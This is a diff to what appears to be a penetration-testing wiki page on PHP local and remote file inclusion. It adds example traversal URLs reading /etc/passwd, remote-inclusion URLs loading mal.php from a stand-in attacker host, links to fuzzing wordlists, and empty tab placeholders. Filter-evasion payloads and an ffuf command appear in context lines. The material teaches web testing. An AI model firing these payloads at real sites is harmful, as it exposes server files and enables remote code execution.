@@ -5,15 +5,18 @@
 **Remote File Inclusion (RFI):** The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is **disabled** by default (**allow\_url\_include**).\
 **Local File Inclusion (LFI):** The sever loads a local file.
 
+```bash
+#Here is a very simple example of an LFI:
+http://example.com/index.php?page=../../../etc/passwd
+
+#Here is a very simple example of an RFI:
+http://example.com/index.php?page=http://atacker.com/mal.php
+http://example.com/index.php?page=\\attacker.com\shared\mal.php
+```
+
 ## Practice
 
 #### Basic LFI
-
-Here is a very simple example of an LFI:
-
-```
-http://example.com/index.php?page=../../../etc/passwd
-```
 
 {% tabs %}
 {% tab title="stripped non-recursively" %}
@@ -71,6 +74,13 @@ $ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/direct
 $ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
 ```
 {% endtab %}
+
+{% tab title="Wordlists" %}
+You may use a wordlist to fuzz parameters and check if they are vulnerable to LFI :
+
+* [file\_inclusion\_windows.txt](https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/file\_inclusion\_windows.txt)
+* [file\_inclusion\_linux.txt](https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/file\_inclusion\_linux.txt)
+{% endtab %}
 {% endtabs %}
 
 #### LFI filter evasion
@@ -112,6 +122,30 @@ http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
 ```
+{% endtab %}
+{% endtabs %}
+
+#### LFI / RFI using PHP wrappers
+
+{% tabs %}
+{% tab title="First Tab" %}
+
+{% endtab %}
+
+{% tab title="Second Tab" %}
+
+{% endtab %}
+{% endtabs %}
+
+#### LFI / RFI using protocols
+
+{% tabs %}
+{% tab title="First Tab" %}
+
+{% endtab %}
+
+{% tab title="Second Tab" %}
+
 {% endtab %}
 {% endtabs %}
 
